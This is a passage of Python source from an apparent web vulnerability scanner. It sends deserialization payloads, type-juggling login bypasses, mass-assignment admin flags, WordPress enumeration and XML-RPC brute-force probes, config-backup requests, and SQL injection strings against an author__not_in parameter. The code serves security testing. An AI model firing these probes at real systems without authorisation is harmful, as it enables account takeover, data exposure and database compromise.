                ('O:8:"stdClass":1:{s:4:"test";s:3:"rce";}', "application/x-php-serialized"),
            ]
        elif "python" in lang:
            # Python pickle (base64)
            payloads = [
                ("gASVEgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFcHJpbnSUhZRSlC4=", "application/octet-stream"),
            ]
        elif "java" in lang:
            # Java serialization magic bytes (aced0005)
            payloads = [
                ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "application/x-java-serialized-object"),
            ]
        else:
            # Generic test
            payloads = [
                ('{"$type": "System.Windows.Forms.BindingSource"}', "application/json"),  # .NET
            ]
        
        # Look for potential deserialization endpoints
        deser_params = ["data", "object", "state", "session", "token", "payload"]
        
        for param in deser_params:
            for payload, content_type in payloads:
                resp = self._make_request("POST", f"{base_url}/api/{param}",
                    data=payload.encode(),
                    headers={"Content-Type": content_type}
                )
                
                # Check for deserialization errors (indicates parsing)
                if any(x in resp.body.lower() for x in ["unserialize", "unpickle", "objectinputstream", "deserialize"]):
                    results.append(VulnTestResult(
                        vuln_type="Insecure Deserialization",
                        payload=payload[:100],
                        target_url=f"{base_url}/api/{param}",
                        request_data=payload,
                        response=resp,
                        is_vulnerable=False,  # Needs manual verification
                        confidence=0.60,
                        evidence="Deserialization error suggests vulnerable endpoint",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
        
        return results
    
    def _test_type_juggling(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for PHP type juggling vulnerabilities."""
        results = []
        
        # Magic hashes that equal "0" when compared loosely
        magic_hashes = [
            "0e462097431906509019562988736854",  # MD5 of "240610708"
            "0e215962017",  # MD5 of "QNKCDZO"
        ]
        
        # Type confusion payloads
        type_payloads = [
            ({"password": True}, "boolean true comparison"),
            ({"password": 0}, "zero comparison"),
            ({"password": []}, "empty array comparison"),
            ({"password": {"password": True}}, "nested object"),
        ]
        
        login_endpoints = [e for e in endpoints if any(
            x in e.url.lower() for x in ["login", "auth", "signin"]
        )]
        
        for endpoint in login_endpoints:
            # Test magic hashes
            for magic in magic_hashes:
                data = {"username": "admin", "password": magic}
                resp = self._make_request("POST", endpoint.url, json_data=data)
                
                if resp.status_code == 200 and any(x in resp.body.lower() for x in ["token", "success", "welcome"]):
                    results.append(VulnTestResult(
                        vuln_type="PHP Type Juggling (Magic Hash)",
                        payload=magic,
                        target_url=endpoint.url,
                        request_data=json.dumps(data),
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.85,
                        evidence="Authentication bypassed with magic hash",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
            
            # Test type confusion
            for payload, desc in type_payloads:
                data = {"username": "admin", **payload}
                resp = self._make_request("POST", endpoint.url, json_data=data)
                
                if resp.status_code == 200 and any(x in resp.body.lower() for x in ["token", "success"]):
                    results.append(VulnTestResult(
                        vuln_type=f"PHP Type Juggling ({desc})",
                        payload=json.dumps(payload),
                        target_url=endpoint.url,
                        request_data=json.dumps(data),
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.85,
                        evidence=f"Authentication bypassed via {desc}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_mass_assignment(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for mass assignment vulnerabilities."""
        results = []
        
        # Dangerous parameters to inject
        dangerous_params = [
            ("isAdmin", True),
            ("admin", True),
            ("role", "admin"),
            ("is_admin", True),
            ("user_type", "admin"),
            ("privileges", ["admin"]),
            ("verified", True),
            ("email_verified", True),
            ("is_superuser", True),
        ]
        
        # Test on registration/update endpoints
        mass_endpoints = [e for e in endpoints if any(
            x in e.url.lower() for x in ["register", "signup", "user", "profile", "update", "account"]
        )]
        
        for endpoint in mass_endpoints:
            for param, value in dangerous_params:
                # Add dangerous param to normal registration data
                data = {
                    "username": f"test_{param}",
                    "email": f"test_{param}@test.com",
                    "password": "TestPassword123!",
                    param: value
                }
                
                resp = self._make_request("POST", endpoint.url, json_data=data)
                
                # Check if param was accepted
                if resp.status_code in [200, 201]:
                    try:
                        resp_data = json.loads(resp.body)
                        # Check if our injected param appears in response
                        if param in str(resp_data) and str(value).lower() in str(resp_data).lower():
                            results.append(VulnTestResult(
                                vuln_type="Mass Assignment",
                                payload=f"{param}={value}",
                                target_url=endpoint.url,
                                request_data=json.dumps(data),
                                response=resp,
                                is_vulnerable=True,
                                confidence=0.85,
                                evidence=f"Privileged parameter '{param}' accepted and reflected",
                                evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                            ))
                            return results
                    except:
                        pass
        
        return results
    
    def _test_wordpress(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for WordPress-specific vulnerabilities."""
        results = []
        
        # ========== 1. WP-JSON API Enumeration ==========
        wp_api_paths = [
            "/wp-json/wp/v2/users",           # User enumeration
            "/wp-json/wp/v2/posts",           # Posts (may reveal drafts)
            "/wp-json/wp/v2/pages",           # Pages
            "/wp-json/wp/v2/media",           # Media files
            "/wp-json/wp/v2/comments",        # Comments
            "/wp-json/wp/v2/settings",        # Settings (admin only)
            "/wp-json/oembed/1.0/embed",      # oEmbed info
            "/?rest_route=/wp/v2/users",      # Alternative route
        ]
        
        for path in wp_api_paths:
            url = f"{base_url}{path}"
            resp = self._make_request("GET", url)
            
            if resp.status_code == 200:
                try:
                    data = json.loads(resp.body)
                    
                    # User enumeration
                    if "users" in path and isinstance(data, list) and len(data) > 0:
                        usernames = [u.get("slug") or u.get("name") for u in data[:5]]
                        self._log(f"[+] WP Users enumerated: {usernames}")
                        results.append(VulnTestResult(
                            vuln_type="WordPress User Enumeration",
                            payload=path,
                            target_url=url,
                            request_data=url,
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.90,
                            evidence=f"Users found: {', '.join(str(u) for u in usernames)}",
                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                        ))
                    
                    # Settings exposed (critical)
                    elif "settings" in path:
                        self._log(f"[!] WP Settings API exposed!")
                        results.append(VulnTestResult(
                            vuln_type="WordPress Settings API Exposed",
                            payload=path,
                            target_url=url,
                            request_data=url,
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.95,
                            evidence="Settings API accessible without authentication",
                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                        ))
                except:
                    pass
        
        # ========== 2. Author ID Enumeration ==========
        for author_id in range(1, 11):
            url = f"{base_url}/?author={author_id}"
            resp = self._make_request("GET", url)
            
            # Check for redirect to author page or username in response
            location = resp.headers.get("Location", "")
            if "/author/" in location:
                username = location.split("/author/")[-1].rstrip("/")
                self._log(f"[+] Author {author_id} = {username}")
                results.append(VulnTestResult(
                    vuln_type="WordPress Author Enumeration",
                    payload=f"?author={author_id}",
                    target_url=url,
                    request_data=url,
                    response=resp,
                    is_vulnerable=True,
                    confidence=0.85,
                    evidence=f"Author ID {author_id} -> username: {username}",
                    evidence_hash=self._hash_evidence(f"{author_id}:{username}")
                ))
                break  # Found one, that's enough to confirm vulnerability
        
        # ========== 3. XML-RPC Vulnerabilities ==========
        xmlrpc_url = f"{base_url}/xmlrpc.php"
        
        # Check if XML-RPC is enabled
        resp = self._make_request("POST", xmlrpc_url, 
            data=b'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
            headers={"Content-Type": "text/xml"}
        )
        
        if resp.status_code == 200 and "methodResponse" in resp.body:
            self._log(f"[+] XML-RPC enabled at {xmlrpc_url}")
            
            # Check for dangerous methods
            dangerous_methods = ["wp.getUsersBlogs", "wp.getUsers", "pingback.ping", "system.multicall"]
            found_methods = [m for m in dangerous_methods if m in resp.body]
            
            if found_methods:
                results.append(VulnTestResult(
                    vuln_type="WordPress XML-RPC Enabled",
                    payload="system.listMethods",
                    target_url=xmlrpc_url,
                    request_data="XML-RPC listMethods",
                    response=resp,
                    is_vulnerable=True,
                    confidence=0.85,
                    evidence=f"Dangerous methods available: {', '.join(found_methods)}",
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
            
            # Test XML-RPC brute force capability (multicall)
            multicall_payload = '''<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params><param><value><array><data>
        <value><struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
                <value><string>admin</string></value>
                <value><string>test123</string></value>
            </data></array></value></member>
        </struct></value>
    </data></array></value></param></params>
</methodCall>'''
            
            resp = self._make_request("POST", xmlrpc_url,
                data=multicall_payload.encode(),
                headers={"Content-Type": "text/xml"}
            )
            
            if resp.status_code == 200 and "methodResponse" in resp.body:
                if "faultCode" not in resp.body or "Incorrect username" in resp.body:
                    results.append(VulnTestResult(
                        vuln_type="WordPress XML-RPC Brute Force Possible",
                        payload="system.multicall",
                        target_url=xmlrpc_url,
                        request_data="multicall brute force test",
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.80,
                        evidence="XML-RPC multicall accepts authentication attempts",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
        
        # ========== 4. Sensitive File Exposure ==========
        sensitive_paths = [
            ("/wp-config.php.bak", "DB_NAME"),
            ("/wp-config.php~", "DB_NAME"),
            ("/wp-config.php.old", "DB_NAME"),
            ("/wp-config.php.save", "DB_NAME"),
            ("/wp-config.php.swp", "DB_NAME"),
            ("/.wp-config.php.swp", "DB_NAME"),
            ("/wp-config.txt", "DB_NAME"),
            ("/wp-config-sample.php", "DB_NAME"),  # Info disclosure
            ("/debug.log", "PHP"),
            ("/wp-content/debug.log", "PHP"),
            ("/.htaccess", "RewriteEngine"),
            ("/readme.html", "WordPress"),
            ("/license.txt", "WordPress"),
            ("/wp-admin/install.php", "WordPress"),
            ("/wp-includes/version.php", "wp_version"),
        ]
        
        for path, indicator in sensitive_paths:
            url = f"{base_url}{path}"
            resp = self._make_request("GET", url)
            
            if resp.status_code == 200 and indicator in resp.body:
                severity = "CRITICAL" if "DB_NAME" in indicator else "INFO"
                is_vuln = severity == "CRITICAL"
                
                self._log(f"[{'!' if is_vuln else '+'}] Sensitive file found: {path}")
                results.append(VulnTestResult(
                    vuln_type=f"WordPress Sensitive File Exposure ({severity})",
                    payload=path,
                    target_url=url,
                    request_data=url,
                    response=resp,
                    is_vulnerable=is_vuln,
                    confidence=0.95 if is_vuln else 0.60,
                    evidence=f"File accessible: {path}",
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
                
                if is_vuln:  # Found config backup, critical!
                    return results
        
        # ========== 5. Plugin/Theme Enumeration ==========
        # Common vulnerable plugins
        vulnerable_plugins = [
            ("contact-form-7", "CVE-2020-35489"),
            ("elementor", "CVE-2022-29455"),
            ("wpforms-lite", "Multiple CVEs"),
            ("classic-editor", "Info"),
            ("akismet", "Info"),
            ("yoast", "Info"),
            ("jetpack", "CVE-2021-24374"),
            ("woocommerce", "Multiple CVEs"),
            ("wp-file-manager", "CVE-2020-25213"),  # Critical RCE
            ("duplicator", "CVE-2020-11738"),
            ("easy-wp-smtp", "CVE-2019-19521"),
            ("revslider", "CVE-2014-9735"),
            ("gravity-forms", "Multiple CVEs"),
            ("all-in-one-seo-pack", "CVE-2021-25032"),
            ("updraftplus", "CVE-2022-0633"),
            ("wordfence", "Info"),
            ("sucuri-scanner", "Info"),
            ("w3-total-cache", "CVE-2021-24436"),
            ("wp-super-cache", "CVE-2021-24209"),
            ("better-wp-security", "Info"),
        ]
        
        for plugin, cve_info in vulnerable_plugins[:10]:  # Limit to avoid too many requests
            # Check plugin directory
            plugin_url = f"{base_url}/wp-content/plugins/{plugin}/readme.txt"
            resp = self._make_request("GET", plugin_url)
            
            if resp.status_code == 200 and ("===" in resp.body or "Stable tag" in resp.body):
                # Extract version
                version = "unknown"
                for line in resp.body.split("\n"):
                    if "Stable tag:" in line:
                        version = line.split(":")[1].strip()
                        break
                    elif "Version:" in line:
                        version = line.split(":")[1].strip()
                        break
                
                self._log(f"[+] Plugin found: {plugin} v{version}")
                results.append(VulnTestResult(
                    vuln_type="WordPress Plugin Detected",
                    payload=plugin,
                    target_url=plugin_url,
                    request_data=plugin_url,
                    response=resp,
                    is_vulnerable=False,  # Info only, need version check
                    confidence=0.70,
                    evidence=f"Plugin: {plugin} v{version} (check: {cve_info})",
                    evidence_hash=self._hash_evidence(f"{plugin}:{version}")
                ))
        
        # ========== 6. Login Page Vulnerabilities ==========
        login_url = f"{base_url}/wp-login.php"
        resp = self._make_request("GET", login_url)
        
        if resp.status_code == 200 and "wp-login" in resp.body:
            # Check for user enumeration via login
            test_users = ["admin", "administrator", "root", "test"]
            for user in test_users:
                # Auto-detect: dict → form-urlencoded
                resp = self._make_request("POST", login_url, data={
                    "log": user,
                    "pwd": "wrongpassword123",
                    "wp-submit": "Log In"
                })
                
                # WordPress gives different errors for valid vs invalid users
                if "invalid username" not in resp.body.lower() and "unknown username" not in resp.body.lower():
                    if "incorrect" in resp.body.lower() or "password" in resp.body.lower():
                        self._log(f"[+] Valid username found: {user}")
                        results.append(VulnTestResult(
                            vuln_type="WordPress Username Enumeration via Login",
                            payload=user,
                            target_url=login_url,
                            request_data=f"log={user}&pwd=wrong",
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.85,
                            evidence=f"Username '{user}' exists (different error message)",
                            evidence_hash=self._hash_evidence(f"{user}:{resp.body[:200]}")
                        ))
                        break
        
        # ========== 7. CVE-2026-60137: WP_Query author__not_in SQL Injection ==========
        # Affects: WordPress 6.8.x < 6.8.6, 6.9.x < 6.9.5, 7.0.x < 7.0.2
        # CWE-89: SQL Injection via author__not_in parameter
        # CISA KEV: Known Exploited Vulnerability
        
        # First, detect WordPress version
        wp_version = None
        version_paths = [
            "/wp-includes/version.php",
            "/readme.html",
            "/feed/",
            "/wp-json/",
        ]
        
        for vpath in version_paths:
            vurl = f"{base_url}{vpath}"
            vresp = self._make_request("GET", vurl)
            
            if vresp.status_code == 200:
                # Extract version from various sources
                import re
                # From version.php: $wp_version = '7.0.1';
                match = re.search(r"\$wp_version\s*=\s*['\"]([0-9.]+)['\"]", vresp.body)
                if match:
                    wp_version = match.group(1)
                    break
                # From readme.html: <br /> Version 7.0.1
                match = re.search(r"Version\s+([0-9.]+)", vresp.body)
                if match:
                    wp_version = match.group(1)
                    break
                # From generator meta tag
                match = re.search(r'generator.*WordPress\s+([0-9.]+)', vresp.body)
                if match:
                    wp_version = match.group(1)
                    break
        
        if wp_version:
            self._log(f"[+] WordPress version detected: {wp_version}")
            
            # Check if version is vulnerable to CVE-2026-60137
            def version_tuple(v):
                return tuple(map(int, v.split('.')[:3]))
            
            try:
                vt = version_tuple(wp_version)
                is_vuln_60137 = False
                is_vuln_63030 = False
                
                # CVE-2026-60137: 6.8.x < 6.8.6, 6.9.x < 6.9.5, 7.0.x < 7.0.2
                if (6, 8, 0) <= vt < (6, 8, 6):
                    is_vuln_60137 = True
                elif (6, 9, 0) <= vt < (6, 9, 5):
                    is_vuln_60137 = True
                    is_vuln_63030 = True  # Also vulnerable to CVE-2026-63030
                elif (7, 0, 0) <= vt < (7, 0, 2):
                    is_vuln_60137 = True
                    is_vuln_63030 = True  # Also vulnerable to CVE-2026-63030
                
                if is_vuln_60137:
                    self._log(f"[!] CRITICAL: WordPress {wp_version} vulnerable to CVE-2026-60137!")
                    results.append(VulnTestResult(
                        vuln_type="CVE-2026-60137: WordPress SQL Injection (CISA KEV)",
                        payload=f"WordPress {wp_version}",
                        target_url=base_url,
                        request_data=f"Version: {wp_version}",
                        response=vresp,
                        is_vulnerable=True,
                        confidence=0.95,
                        evidence=f"WordPress {wp_version} is vulnerable to CVE-2026-60137 (author__not_in SQLi). CVSS 9.1 CRITICAL. Upgrade to 6.8.6+/6.9.5+/7.0.2+",
                        evidence_hash=self._hash_evidence(f"CVE-2026-60137:{wp_version}")
                    ))
                
                if is_vuln_63030:
                    self._log(f"[!] CRITICAL: WordPress {wp_version} vulnerable to CVE-2026-63030 (RCE)!")
                    results.append(VulnTestResult(
                        vuln_type="CVE-2026-63030: WordPress REST API RCE (CISA KEV)",
                        payload=f"WordPress {wp_version}",
                        target_url=base_url,
                        request_data=f"Version: {wp_version}",
                        response=vresp,
                        is_vulnerable=True,
                        confidence=0.95,
                        evidence=f"WordPress {wp_version} is vulnerable to CVE-2026-63030 (REST API batch + SQLi = RCE). CVSS 9.8 CRITICAL. Upgrade to 6.9.5+/7.0.2+",
                        evidence_hash=self._hash_evidence(f"CVE-2026-63030:{wp_version}")
                    ))
            except:
                pass
        
        # ========== 8. CVE-2026-60137/63030: Active Exploitation Test ==========
        # Test for author__not_in SQL injection
        sqli_test_urls = [
            f"{base_url}/wp-json/wp/v2/posts?author__not_in[0]=1) OR 1=1--",
            f"{base_url}/wp-json/wp/v2/posts?author__not_in=1) UNION SELECT 1--",
            f"{base_url}/?rest_route=/wp/v2/posts&author__not_in[0]=1) OR SLEEP(2)--",
        ]
        
        for sqli_url in sqli_test_urls:
            sqli_resp = self._make_request("GET", sqli_url)
            
            # Check for SQLi indicators
            sqli_indicators = [
                "SQL syntax",
                "mysql_",
                "mysqli_",
                "PDOException",
                "SQLSTATE",
                "unclosed quotation",
                "unterminated string",
            ]
            
            if sqli_resp.status_code == 200 or any(ind in sqli_resp.body for ind in sqli_indicators):
                # Time-based check for blind SQLi
                if "SLEEP" in sqli_url and sqli_resp.elapsed_ms >= 2000:
                    self._log(f"[!] CONFIRMED: CVE-2026-60137 SQLi is exploitable (time-based)!")
                    results.append(VulnTestResult(
                        vuln_type="CVE-2026-60137: SQL Injection CONFIRMED (Time-Based)",
                        payload=sqli_url,
                        target_url=sqli_url,
                        request_data=sqli_url,
                        response=sqli_resp,
                        is_vulnerable=True,
                        confidence=0.99,
                        evidence=f"Time-based SQLi confirmed: {sqli_resp.elapsed_ms}ms delay with SLEEP(2)",
                        evidence_hash=self._hash_evidence(f"CVE-2026-60137-EXPLOIT:{sqli_resp.elapsed_ms}")
                    ))
                    break
                elif any(ind in sqli_resp.body for ind in sqli_indicators):
                    self._log(f"[!] CONFIRMED: CVE-2026-60137 SQLi error-based!")
                    results.append(VulnTestResult(
                        vuln_type="CVE-2026-60137: SQL Injection CONFIRMED (Error-Based)",
                        payload=sqli_url,
                        target_url=sqli_url,
                        request_data=sqli_url,
                        response=sqli_resp,
                        is_vulnerable=True,
                        confidence=0.98,
                        evidence=f"SQL error in response indicates vulnerable endpoint",
                        evidence_hash=self._hash_evidence(f"CVE-2026-60137-EXPLOIT:{sqli_resp.body[:200]}")
                    ))
                    break
        
        # ========== 9. CVE-2026-63030: REST API Batch Endpoint Test ==========
        # Route confusion in /wp-json/batch/v1
        batch_url = f"{base_url}/wp-json/batch/v1"
        batch_payload = {
            "requests": [
                {
                    "path": "/wp/v2/posts?author__not_in[0]=1) OR 1=1--",
                    "method": "GET"
                },
                {
                    "path": "/wp/v2/users",
                    "method": "GET"
                }
            ]
        }
        
        batch_resp = self._make_request("POST", batch_url, json_data=batch_payload)
        
        if batch_resp.status_code == 200:
            try:
                batch_data = json.loads(batch_resp.body)
                if "responses" in batch_data or isinstance(batch_data, list):
                    self._log(f"[!] REST API batch endpoint accessible - potential CVE-2026-63030")
                    results.append(VulnTestResult(
                        vuln_type="CVE-2026-63030: REST API Batch Endpoint Accessible",
                        payload=json.dumps(batch_payload),
                        target_url=batch_url,
                        request_data=json.dumps(batch_payload),
                        response=batch_resp,
                        is_vulnerable=True,
                        confidence=0.85,
                        evidence="Batch endpoint accepts requests - combined with CVE-2026-60137 enables RCE",
                        evidence_hash=self._hash_evidence(f"CVE-2026-63030:{batch_resp.body[:200]}")
                    ))
            except:
                pass
        
        return results
